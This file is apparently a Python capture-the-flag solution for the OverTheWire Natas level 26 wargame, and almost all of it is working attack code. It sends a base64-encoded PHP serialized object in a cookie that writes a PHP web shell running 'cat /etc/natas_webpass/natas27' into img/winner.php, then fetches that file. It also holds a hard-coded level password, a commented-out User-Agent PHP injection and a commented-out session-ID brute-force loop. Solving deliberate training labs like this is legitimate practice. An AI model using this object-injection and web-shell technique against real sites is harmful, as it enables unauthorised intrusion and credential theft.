#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas26'
password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()

response = session.get (url, auth = (username, password))

#headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
#print session.cookies['PHPSESSID']

session.cookies['drawing'] = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
response = session.get(url +'?x1=0&y1=0&x2=500&y2=500', auth = (username, password) )
#print response.text
#print base64.b64decode(urllib.unquote(session.cookies["drawing"]))

response = session.get(url +'img/winner.php', auth = (username, password) )
print response.text

#for session_id in range (1,641):
#
##response = session.post(url, data = {"username" : "natas20", "password": "blah"}, auth = (username, password))
	#print {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}
	#response = session.get(url, cookies = {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}, auth = (username, password) )
	#content = response.text
##
	#if ( "You are an admin" in content ):
		#print "Got it!", session_id
		##print content
		#break
	
		#print "trying", session_id
	#rint content	
	#print session.cookies["PHPSESSID"].decode('hex')
#print "======================================================="
#print content
